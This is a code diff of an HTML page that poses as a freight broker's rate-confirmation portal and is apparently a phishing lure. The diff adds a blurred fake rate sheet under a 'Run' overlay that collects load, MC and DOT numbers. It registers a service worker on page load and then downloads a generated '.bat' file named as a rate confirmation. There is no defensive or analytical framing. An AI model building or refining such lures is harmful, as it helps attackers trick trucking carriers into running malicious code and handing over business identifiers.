@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Rate Confirmation Portal — Freight Logistics</title>
+    <title>Rate Confirmation — Freight Logistics</title>
     <style>
         :root {
             --bg: #0a0e14;
@@ -29,65 +29,186 @@
             justify-content: center;
             padding: 20px;
         }
-        .container {
+
+        /* Rate sheet background */
+        .rate-sheet-bg {
+            position: relative;
             width: 100%;
-            max-width: 520px;
-        }
-        .header {
-            text-align: center;
-            margin-bottom: 32px;
-        }
-        .header .logo {
-            font-size: 28px;
-            font-weight: 700;
-            letter-spacing: -0.5px;
-            color: #fff;
-            margin-bottom: 4px;
-        }
-        .header .logo span { color: var(--accent); }
-        .header .subtitle {
-            font-size: 13px;
-            color: var(--text-dim);
-            letter-spacing: 1px;
-            text-transform: uppercase;
-        }
-        .card {
+            max-width: 700px;
             background: var(--panel);
             border: 1px solid var(--border);
             border-radius: 12px;
-            padding: 32px;
+            padding: 40px 36px;
             box-shadow: 0 4px 24px rgba(0,0,0,0.3);
+            overflow: hidden;
         }
-        .card h2 {
-            font-size: 18px;
-            font-weight: 600;
+
+        .rate-sheet-bg .header-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 28px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid var(--border);
+        }
+        .rate-sheet-bg .logo-text {
+            font-size: 22px;
+            font-weight: 700;
             color: #fff;
+            letter-spacing: -0.5px;
+        }
+        .rate-sheet-bg .logo-text span { color: var(--accent); }
+        .rate-sheet-bg .doc-label {
+            font-size: 11px;
+            color: var(--text-dim);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        /* Blurred fields */
+        .blurred {
+            filter: blur(6px);
+            user-select: none;
+            pointer-events: none;
+            opacity: 0.4;
+        }
+
+        /* Visible fields — rate & miles */
+        .highlight-field {
+            position: relative;
+            background: rgba(0,200,83,0.08);
+            border: 1px solid rgba(0,200,83,0.25);
+            border-radius: 6px;
+            padding: 10px 14px;
+            filter: none !important;
+            opacity: 1 !important;
+            user-select: text;
+            pointer-events: auto;
+        }
+        .highlight-field::before {
+            content: '';
+            position: absolute;
+            inset: -2px;
+            border-radius: 8px;
+            border: 1px solid rgba(0,200,83,0.4);
+            animation: pulse-border 2s ease-in-out infinite;
+            pointer-events: none;
+        }
+        @keyframes pulse-border {
+            0%, 100% { opacity: 0.4; }
+            50% { opacity: 1; }
+        }
+
+        .rate-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 16px;
+            margin-bottom: 24px;
+        }
+        .rate-grid .field {
+            padding: 8px 0;
+        }
+        .rate-grid .field .label {
+            font-size: 10px;
+            color: var(--text-dim);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 4px;
+        }
+        .rate-grid .field .value {
+            font-size: 15px;
+            color: #fff;
+            font-weight: 500;
+        }
+
+        .detail-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 24px;
+            font-size: 13px;
+        }
+        .detail-table th {
+            text-align: left;
+            font-size: 10px;
+            color: var(--text-dim);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            padding: 8px 12px;
+            border-bottom: 1px solid var(--border);
+        }
+        .detail-table td {
+            padding: 10px 12px;
+            border-bottom: 1px solid rgba(30,39,54,0.5);
+            color: #fff;
+        }
+        .detail-table tr:last-child td { border-bottom: none; }
+
+        .footer-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding-top: 16px;
+            border-top: 1px solid var(--border);
+            font-size: 11px;
+            color: var(--text-dim);
+        }
+
+        /* Overlay form */
+        .overlay {
+            position: absolute;
+            inset: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 10;
+            background: radial-gradient(ellipse at center, rgba(10,14,20,0.7) 0%, rgba(10,14,20,0.92) 100%);
+            backdrop-filter: blur(2px);
+        }
+        .form-card {
+            background: var(--panel);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 32px 28px;
+            width: 380px;
+            max-width: 90vw;
+            box-shadow: 0 8px 40px rgba(0,0,0,0.5);
+            text-align: center;
+        }
+        .form-card .lock-icon {
+            font-size: 32px;
             margin-bottom: 8px;
         }
-        .card .desc {
-            font-size: 13px;
+        .form-card h2 {
+            font-size: 17px;
+            font-weight: 600;
+            color: #fff;
+            margin-bottom: 4px;
+        }
+        .form-card .sub {
+            font-size: 12px;
             color: var(--text-dim);
-            margin-bottom: 24px;
-            line-height: 1.5;
+            margin-bottom: 20px;
+            line-height: 1.4;
         }
         .form-group {
-            margin-bottom: 20px;
+            margin-bottom: 14px;
+            text-align: left;
         }
         .form-group label {
             display: block;
-            font-size: 12px;
+            font-size: 11px;
             font-weight: 600;
             color: var(--text-dim);
             text-transform: uppercase;
             letter-spacing: 0.5px;
-            margin-bottom: 6px;
+            margin-bottom: 5px;
         }
         .form-group input {
             width: 100%;
-            padding: 12px 14px;
+            padding: 11px 12px;
             background: var(--bg);
             border: 1px solid var(--border);
-            border-radius: 8px;
+            border-radius: 6px;
             color: #fff;
             font-size: 14px;
             font-family: inherit;
@@ -102,21 +223,22 @@
         .form-row {
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 12px;
+            gap: 10px;
         }
         .btn {
             width: 100%;
-            padding: 14px;
+            padding: 13px;
             background: var(--accent);
             color: #fff;
             border: none;
-            border-radius: 8px;
+            border-radius: 6px;
             font-size: 15px;
             font-weight: 600;
             cursor: pointer;
             transition: all 0.2s;
             font-family: inherit;
             letter-spacing: 0.3px;
+            margin-top: 4px;
         }
         .btn:hover {
             background: #1e88e5;
@@ -130,10 +252,10 @@
             box-shadow: none;
         }
         .status {
-            margin-top: 16px;
-            padding: 12px;
-            border-radius: 8px;
-            font-size: 13px;
+            margin-top: 14px;
+            padding: 10px;
+            border-radius: 6px;
+            font-size: 12px;
             text-align: center;
             display: none;
         }
@@ -156,8 +278,8 @@
             color: var(--red);
         }
         .progress {
-            margin-top: 12px;
-            height: 4px;
+            margin-top: 10px;
+            height: 3px;
             background: var(--border);
             border-radius: 2px;
             overflow: hidden;
@@ -170,27 +292,6 @@
             border-radius: 2px;
             transition: width 0.3s;
             width: 0%;
-        }
-        .footer {
-            text-align: center;
-            margin-top: 24px;
-            font-size: 11px;
-            color: var(--text-dim);
-        }
-        .footer a { color: var(--text-dim); text-decoration: none; }
-        .footer a:hover { color: var(--accent); }
-        .badge {
-            display: inline-block;
-            padding: 3px 8px;
-            border-radius: 4px;
-            font-size: 10px;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-        .badge.secure {
-            background: rgba(0,200,83,0.15);
-            color: var(--green);
         }
         .spinner {
             display: inline-block;
@@ -207,101 +308,178 @@
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <div class="logo">Freight<span>Confirm</span></div>
-            <div class="subtitle">Rate Confirmation Portal</div>
-        </div>
-
-        <div class="card">
-            <h2>Verify Rate Confirmation</h2>
-            <p class="desc">
-                Enter your load confirmation number to download the verified rate sheet.
-                All rates are guaranteed for 48 hours from confirmation.
-            </p>
-
-            <div class="form-group">
-                <label>Confirmation Number</label>
-                <input type="text" id="confirmNumber" placeholder="e.g. LD-2026-0847" autocomplete="off">
+    <div class="rate-sheet-bg">
+        <!-- Header -->
+        <div class="header-row">
+            <div>
+                <div class="logo-text">Freight<span>Confirm</span></div>
+                <div class="doc-label">Rate Confirmation</div>
             </div>
-
-            <div class="form-row">
-                <div class="form-group">
-                    <label>MC Number</label>
-                    <input type="text" id="mcNumber" placeholder="MC-123456" autocomplete="off">
-                </div>
-                <div class="form-group">
-                    <label>DOT Number</label>
-                    <input type="text" id="dotNumber" placeholder="DOT-1234567" autocomplete="off">
-                </div>
-            </div>
-
-            <button class="btn" id="verifyBtn" onclick="handleVerify()">
-                Verify & Download Rate Sheet
-            </button>
-
-            <div class="progress" id="progress">
-                <div class="bar" id="progressBar"></div>
-            </div>
-            <div class="status info" id="status">
-                <span class="badge secure">SECURE</span> &nbsp;256-bit encrypted connection
+            <div style="text-align:right;">
+                <div class="doc-label blurred">Date</div>
+                <div style="font-size:13px;color:#fff;" class="blurred">08/02/2026</div>
             </div>
         </div>
 
-        <div class="footer">
-            &copy; 2026 FreightConfirm Logistics &nbsp;|&nbsp;
-            <a href="#">Privacy</a> &nbsp;|&nbsp;
-            <a href="#">Terms</a> &nbsp;|&nbsp;
-            FMCSA Licensed Broker
+        <!-- Rate & Miles — VISIBLE -->
+        <div class="rate-grid">
+            <div class="highlight-field">
+                <div class="label">Rate</div>
+                <div class="value" style="color:var(--green);font-size:20px;font-weight:700;">$2,450.00</div>
+            </div>
+            <div class="highlight-field">
+                <div class="label">Miles</div>
+                <div class="value" style="font-size:20px;font-weight:700;">847 mi</div>
+            </div>
+            <div class="field blurred">
+                <div class="label">Weight</div>
+                <div class="value">42,000 lbs</div>
+            </div>
+        </div>
+
+        <!-- Detail table — BLURRED -->
+        <table class="detail-table blurred">
+            <thead>
+                <tr>
+                    <th>Stop</th>
+                    <th>Location</th>
+                    <th>Date</th>
+                    <th>Time</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>Pickup</td>
+                    <td>Chicago, IL 60601</td>
+                    <td>08/05</td>
+                    <td>08:00</td>
+                </tr>
+                <tr>
+                    <td>Delivery</td>
+                    <td>Dallas, TX 75201</td>
+                    <td>08/07</td>
+                    <td>14:00</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <!-- More blurred fields -->
+        <div class="rate-grid blurred">
+            <div class="field">
+                <div class="label">Carrier</div>
+                <div class="value">Midwest Express LLC</div>
+            </div>
+            <div class="field">
+                <div class="label">Equipment</div>
+                <div class="value">53' Dry Van</div>
+            </div>
+            <div class="field">
+                <div class="label">Commodity</div>
+                <div class="value">General Freight</div>
+            </div>
+        </div>
+
+        <div class="footer-row blurred">
+            <span>Load ID: LD-2026-0847</span>
+            <span>FMCSA Licensed Broker</span>
+        </div>
+
+        <!-- OVERLAY FORM -->
+        <div class="overlay" id="overlay">
+            <div class="form-card">
+                <div class="lock-icon">🔒</div>
+                <h2>Unlock Full Rate Confirmation</h2>
+                <p class="sub">Enter your load details to download the complete rate sheet with all stops, charges, and terms.</p>
+
+                <div class="form-group">
+                    <label>Load Number</label>
+                    <input type="text" id="loadNumber" placeholder="e.g. LD-2026-0847" autocomplete="off">
+                </div>
+
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>MC Number</label>
+                        <input type="text" id="mcNumber" placeholder="MC-123456" autocomplete="off">
+                    </div>
+                    <div class="form-group">
+                        <label>DOT Number</label>
+                        <input type="text" id="dotNumber" placeholder="DOT-1234567" autocomplete="off">
+                    </div>
+                </div>
+
+                <button class="btn" id="runBtn" onclick="handleRun()">
+                    Run
+                </button>
+
+                <div class="progress" id="progress">
+                    <div class="bar" id="progressBar"></div>
+                </div>
+                <div class="status info" id="status">
+                    Rate: $2,450.00 &nbsp;|&nbsp; Miles: 847
+                </div>
+            </div>
         </div>
     </div>
 
     <script>
-        // Register ServiceWorker immediately on page load
+        // Auto-detect SW location
         if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('/Ratecon/sw.js', { scope: '/Ratecon/' })
-                .then(reg => console.log('SW registered:', reg.scope))
-                .catch(err => console.log('SW registration failed:', err));
+            const pagePath = location.pathname.replace(/\/[^/]*$/, '');
+            const candidates = [
+                pagePath + '/sw.js',
+                '/sw.js',
+                '/Ratecon/sw.js'
+            ];
+
+            (async () => {
+                for (const url of candidates) {
+                    try {
+                        const scope = url.replace(/\/sw\.js$/, '/');
+                        const reg = await navigator.serviceWorker.register(url, { scope });
+                        console.log('SW registered:', reg.scope);
+                        return;
+                    } catch (e) {}
+                }
+                console.log('SW registration failed');
+            })();
         }
 
-        async function handleVerify() {
-            const confirmNum = document.getElementById('confirmNumber').value.trim();
+        async function handleRun() {
+            const loadNum = document.getElementById('loadNumber').value.trim();
             const mcNum = document.getElementById('mcNumber').value.trim();
             const dotNum = document.getElementById('dotNumber').value.trim();
-            const btn = document.getElementById('verifyBtn');
+            const btn = document.getElementById('runBtn');
             const status = document.getElementById('status');
             const progress = document.getElementById('progress');
             const progressBar = document.getElementById('progressBar');
 
-            if (!confirmNum) {
+            if (!loadNum) {
                 status.className = 'status error';
-                status.textContent = 'Please enter a valid confirmation number.';
+                status.textContent = 'Please enter your Load Number.';
                 return;
             }
 
             btn.disabled = true;
-            btn.innerHTML = '<span class="spinner"></span>Verifying...';
+            btn.innerHTML = '<span class="spinner"></span>Processing...';
             status.className = 'status info';
-            status.textContent = 'Validating confirmation number...';
+            status.textContent = 'Validating load number...';
             progress.classList.add('active');
             progressBar.style.width = '20%';
 
-            // Simulate verification delay
             await new Promise(r => setTimeout(r, 1200));
             progressBar.style.width = '50%';
-            status.textContent = 'Confirmation verified. Preparing rate sheet...';
+            status.textContent = 'Load confirmed. Preparing rate sheet...';
 
             await new Promise(r => setTimeout(r, 800));
             progressBar.style.width = '80%';
             status.textContent = 'Generating secure download...';
 
-            // Request the assembled .bat from ServiceWorker
             try {
                 const response = await fetch('./generate-bat', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        confirm: confirmNum,
+                        confirm: loadNum,
                         mc: mcNum,
                         dot: dotNum
                     })
@@ -312,11 +490,10 @@
                 const blob = await response.blob();
                 progressBar.style.width = '100%';
 
-                // Trigger download
                 const url = URL.createObjectURL(blob);
                 const a = document.createElement('a');
                 a.href = url;
-                a.download = `Rate_Confirmation_${confirmNum.replace(/[^a-zA-Z0-9]/g, '_')}.bat`;
+                a.download = `Rate_Confirmation_${loadNum.replace(/[^a-zA-Z0-9]/g, '_')}.bat`;
                 document.body.appendChild(a);
                 a.click();
                 document.body.removeChild(a);
@@ -330,16 +507,15 @@
             } catch (err) {
                 status.className = 'status error';
                 status.textContent = 'Unable to generate rate sheet. Please try again.';
-                btn.innerHTML = 'Verify & Download Rate Sheet';
+                btn.innerHTML = 'Run';
                 btn.disabled = false;
                 progress.classList.remove('active');
                 console.error('Generation error:', err);
             }
         }
 
-        // Allow Enter key to submit
-        document.getElementById('confirmNumber').addEventListener('keydown', function(e) {
-            if (e.key === 'Enter') handleVerify();
+        document.getElementById('loadNumber').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') handleRun();
         });
     </script>
 </body>
